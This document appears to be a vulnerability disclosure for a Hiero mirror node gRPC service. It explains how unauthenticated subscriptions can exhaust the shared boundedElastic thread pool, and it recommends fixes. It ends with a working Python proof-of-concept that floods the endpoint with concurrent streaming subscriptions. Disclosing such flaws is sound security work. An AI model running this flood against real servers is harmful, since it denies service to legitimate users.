### Title
Unbounded Concurrent Subscriptions Exhaust Shared `boundedElastic` Scheduler Thread Pool in `PollingTopicListener`

### Summary
`PollingTopicListener.listen()` assigns each subscription a periodic polling loop that executes a blocking JDBC database query (`topicMessageRepository.findByFilter`) on threads from the global `Schedulers.boundedElastic()` instance. Because there is no limit on the number of concurrent gRPC connections or total subscriptions, an unauthenticated attacker can open enough concurrent subscriptions to exhaust the bounded thread pool, starving legitimate subscribers of scheduler threads and degrading or halting all polling-based topic delivery.

### Finding Description
**Exact code path:**

`PollingTopicListener.java` line 31 acquires the global `boundedElastic` scheduler:
```java
private final Scheduler scheduler = Schedulers.boundedElastic();
```
`Schedulers.boundedElastic()` is a factory that returns the **globally cached** Reactor `boundedElastic` instance (capped at `10 × Runtime.getRuntime().availableProcessors()` threads, e.g. 80 threads on an 8-core host).

`listen()` lines 38–43 wire every subscription's poll cycle onto that scheduler:
```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)   // line 39 – fires subscription on a boundedElastic thread
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .withFixedDelay(interval)
                .withScheduler(scheduler))         // line 43 – each repeat delay fires on a boundedElastic thread
```

When the delay fires, the `Flux.defer` is subscribed on that scheduler thread, which immediately calls `poll(context)` (line 51). `poll()` calls:
```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));  // line 61
```
`findByFilter` executes a **synchronous, blocking JDBC query** (returns a `java.util.stream.Stream`). The `boundedElastic` thread is held for the entire duration of that DB round-trip before being released.

**Root cause / failed assumption:** The design assumes a small, bounded number of concurrent subscriptions. There is no guard on total concurrent subscriptions or connections. The only server-side limit is `maxConcurrentCallsPerConnection = 5` (`NettyProperties.java` line 14, `GrpcConfiguration.java` line 33), which caps calls *per connection* but places no ceiling on the number of connections. The gRPC endpoint requires no authentication (`ConsensusController.java` lines 43–53 — no auth interceptor).

**Exploit flow:**
1. Attacker opens *N* gRPC connections to port 5600 (no auth, no connection limit).
2. Each connection issues 5 concurrent `subscribeTopic` RPCs (the per-connection maximum).
3. Each subscription enters `PollingTopicListener.listen()`, scheduling a periodic blocking DB poll on the global `boundedElastic` scheduler.
4. With `N × 5` concurrent subscriptions all polling simultaneously, the `boundedElastic` thread pool saturates.
5. New timer callbacks from legitimate subscribers queue behind the attacker's tasks; polling intervals balloon from 500 ms to seconds or minutes.
6. The same global scheduler is used by `TopicMessageServiceImpl` line 70 (`Schedulers.boundedElastic()`) for the safety-check path, so that path is also starved.

### Impact Explanation
- **Polling starvation:** Legitimate subscribers receive no new topic messages until a scheduler thread becomes free; effective polling interval grows unboundedly.
- **Cascading DB pressure:** Each attacker subscription issues a full-table-range query (`findByFilter`) every 500 ms. With hundreds of subscriptions, the DB connection pool and query throughput are also exhausted, amplifying the DoS.
- **Global scheduler contamination:** Because `Schedulers.boundedElastic()` returns the JVM-wide cached instance, exhaustion affects every Reactor component in the process that uses `boundedElastic`, not just `PollingTopicListener`.
- This is a non-network-based DoS (resource exhaustion via thread starvation) requiring no special privileges, directly matching the stated scope.

### Likelihood Explanation
- No authentication is required to call `subscribeTopic` on the gRPC endpoint.
- No total-connection or total-subscription limit exists in the server configuration.
- The attacker needs only `ceil(threadPoolSize / 5)` connections (e.g., 16 connections on an 8-core host) to saturate the pool, achievable from a single machine with a trivial gRPC client script.
- The attack is repeatable and persistent: subscriptions are long-lived streaming RPCs, so the attacker holds threads indefinitely at negligible bandwidth cost.
- This is only exploitable when `hiero.mirror.grpc.listener.type = POLL` is configured; the default is `REDIS`, which reduces the exposed population but does not eliminate it.

### Recommendation
1. **Enforce a global subscription limit:** Track active subscription count (e.g., reuse the existing `subscriberCount` `AtomicLong` in `TopicMessageServiceImpl`) and reject new subscriptions above a configurable ceiling.
2. **Limit total gRPC connections:** Add `serverBuilder.maxConnectionAge(...)` / `serverBuilder.maxConnections(...)` in `GrpcConfiguration.grpcServerConfigurer` to cap total simultaneous connections.
3. **Decouple blocking DB work from the scheduler:** Execute `topicMessageRepository.findByFilter` inside a dedicated, separately bounded thread pool (not the global `boundedElastic`) so attacker subscriptions cannot starve the shared scheduler.
4. **Rate-limit subscriptions per source IP** at the load-balancer or via a gRPC interceptor.

### Proof of Concept
```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 20   # 20 connections × 5 calls = 100 subscriptions > typical thread pool
CALLS_PER_CONN = 5

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
    )
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(
            target=lambda: list(stub.subscribeTopic(query))  # blocking stream
        )
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

pool = [threading.Thread(target=flood_connection, args=(i,)) for i in range(CONNECTIONS)]
for t in pool: t.start()
for t in pool: t.join()
# Result: boundedElastic thread pool saturated; legitimate subscribers experience
# polling delays proportional to queue depth, effectively halting message delivery.
```